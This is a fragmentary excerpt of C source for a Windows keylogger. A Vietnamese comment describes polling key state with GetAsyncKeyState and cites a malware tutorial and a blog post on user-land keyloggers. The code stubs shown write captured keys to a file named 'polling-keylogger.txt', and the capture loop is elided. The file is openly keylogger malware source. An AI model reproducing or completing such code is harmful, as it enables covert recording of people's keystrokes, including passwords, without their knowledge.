...
/*
** - Sử dụng Windows Polling (GetAsyncKeyState) để kiểm tra trạng thái của một phím có được nhấn hay không.
** 1. Virtual-Key Codes: https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
** 2. C/C++ Malware — Simple Keylogger | Log Keystrokes: https://youtu.be/8X2UOfkOuZY
** 3. Windows Keylogger Part 1: Attack on user land: https://eyeofrablog.wordpress.com/2017/06/11/windows-keylogger-part-1-attack-on-user-land/
*/

void WriteToLog(char* buffer, TCHAR* tc_filePath)
{
	char filePath[MAX_PATH];
	wcstombs(filePath, tc_filePath, MAX_PATH);
...
int KeyIsListed(int key, TCHAR* filePath)
{
	switch (key)
	{
...
int main()
{
	...
	wsprintfW(filePath, TEXT("%s\\polling-keylogger.txt"), filePath);
